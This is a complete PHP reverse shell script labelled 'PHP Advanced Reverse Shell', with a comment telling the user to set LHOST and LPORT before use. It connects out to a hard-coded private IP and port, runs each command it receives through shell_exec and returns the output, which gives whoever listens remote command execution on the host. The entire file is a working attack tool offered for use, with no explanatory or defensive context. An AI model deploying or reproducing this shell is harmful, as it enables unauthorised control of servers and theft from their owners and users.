<?php
// PHP Advanced Reverse Shell
// Configure LHOST and LPORT before use

$LHOST = '192.168.1.100';
$LPORT = 4453;

$socket = fsockopen($LHOST, $LPORT);
while (true) {
    $command = fgets($socket);
    if ($command == "exit\n") {
        break;
    }
    $output = shell_exec($command);
    fwrite($socket, $output);
}
fclose($socket);
?>
